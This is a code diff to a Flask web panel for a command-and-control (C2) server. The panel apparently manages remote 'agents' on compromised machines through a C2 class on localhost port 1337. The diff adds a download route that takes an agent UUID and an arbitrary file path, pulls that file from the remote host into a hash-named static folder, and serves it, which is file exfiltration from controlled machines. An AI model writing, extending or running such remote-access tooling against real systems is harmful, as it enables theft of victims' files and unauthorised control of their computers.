@@ -3,13 +3,14 @@ from uuid import UUID
 from flask import Flask, render_template, redirect, url_for, request
 from flask_sock import Sock
 from simple_websocket.ws import Server
-from time import sleep
+from pathlib import Path
 
 from c2 import C2
 
 c2 = C2(("127.0.0.1", 1337))
 app = Flask(__name__)
 sock = Sock(app)
+download_dir = Path("227eb601e5bf8ea0c5da13a26be3eba2e5fea2cd7d75dcd2951cf615dd790da5")
 
 
 @app.route("/")
@@ -84,6 +85,18 @@ def websocket(ws: Server, uuid, pid):
             read = current
         if not process.alive:
             break
+
+
+@app.route("/agent/<uuid>/download")
+def download_file(uuid):
+    uuid = UUID(uuid)
+    agent = c2.agents.get(uuid)
+    if agent is None:
+        return "Not found", 404
+    path = request.args["file"]
+    local = Path(path)
+    agent.download_file(path, Path("static") / download_dir / local.name)
+    return redirect(f"/static/{download_dir}/{local.name}")
 
 
 if __name__ == '__main__':
